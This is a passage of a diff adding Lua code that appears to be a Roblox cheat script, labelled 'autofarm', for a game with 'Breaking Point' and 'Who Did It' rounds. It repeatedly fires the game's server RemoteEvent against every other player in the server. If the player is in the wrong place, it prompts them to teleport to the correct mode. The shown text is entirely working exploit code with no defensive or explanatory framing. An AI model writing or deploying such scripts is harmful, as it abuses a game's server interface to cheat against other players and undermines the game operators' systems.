+							pcall(function()
+								game:GetService("ReplicatedStorage").RemoteEvent:FireServer(30, v)
+							end)
+						end
+					end
+				end)
+			else
+			if RoundMode == "Breaking Point" or RoundMode == "Who Did It" then
+				pcall(function()
+					game:GetService("ReplicatedStorage").RemoteEvent:FireServer(16, "public")
+				end)
+					spawn(function()
+						for i, v in pairs(game.Players:GetPlayers()) do
+							if v.Name == game.Players.LocalPlayer.Name then
+							else
+								pcall(function()
+									game:GetService("ReplicatedStorage").RemoteEvent:FireServer(30, v)
+								end)
+							end
+						end
+					end)
+			end
+		end
+		else
+			task.wait(0.5)
+		end
+	end
+else
+	game.StarterGui:SetCore(
+		"SendNotification",
+		{
+			Title = "Notification",
+			Text = "You need to teleport to the correct mode to autofarm"
+		}
+	)
+	task.wait(5)
+	Notify("You need to teleport to the correct mode to autofarm")
+	--game:GetService("TeleportService"):Teleport(NeededPlaceId, LocalPlayer)
+end
